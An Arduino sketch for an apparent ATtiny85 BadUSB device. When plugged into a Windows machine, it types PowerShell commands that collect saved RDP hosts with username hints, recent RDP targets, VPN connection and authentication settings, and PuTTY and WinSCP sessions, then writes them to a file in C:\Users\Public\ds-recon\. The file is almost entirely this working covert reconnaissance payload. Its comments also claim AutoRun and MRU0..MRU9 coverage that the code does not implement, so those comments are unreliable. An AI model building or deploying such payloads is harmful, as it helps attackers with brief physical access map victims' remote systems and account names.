// recon/remote-access - Tier 2
//
// Every remote target this user has ever saved: RDP, VPN, PuTTY, WinSCP, AutoRun.
//
// MRU0..MRU9 are the most-missed keys in RDP recon - they hold the most
// recently used targets and are not shown in the Server list.
//
// Read-only, no persistence, nothing left behind except the text file named in
// R_OUT. Output lands in C:\Users\Public\ds-recon\ on the target.

#include <duck.h>

// PROGMEM: this string must live in flash, not SRAM. The ATtiny85 has 512
// bytes of RAM and this script is far larger than that.
static const char S[] PROGMEM =
    R_MKDIR
    "'=== SAVED RDP HOSTS ==='"
    "Get-ChildItem 'HKCU:\\Software\\Microsoft\\Terminal Server Client\\Servers' -EA 0|Select -Expand PSChildName"
    "Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Terminal Server Client\\Servers\\*' -EA 0|Select PSChildName,UsernameHint|Format-List"
    "'=== DEFAULT RDP TARGET ==='"
    "Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Terminal Server Client' -EA 0|Select MRU0,MRU1,MRU2"
    "'=== VPN CONNECTIONS ==='"
    "Get-VpnConnection -EA 0|Select Name,ServerAddress,TunnelType,AuthenticationMethod,SplitTunneling|Format-List"
    "'=== PUTTY SESSIONS ==='"
    "Get-ChildItem 'HKCU:\\Software\\SimonTatham\\PuTTY\\Sessions' -EA 0|Select -Expand PSChildName"
    "'=== WINSCP SESSIONS ==='"
    "Get-ChildItem 'HKCU:\\Software\\Martin Prikryl\\WinSCP 2\\Sessions' -EA 0|Select -Expand PSChildName"
    R_OUT("remote-access.txt")
    R_SHOW("remote-access.txt");

void setup() {
  duckBegin();
  ledPulse(2, 120, 120);
  recon(S);
  ledPulse(4, 150, 150);
}

void loop() {}
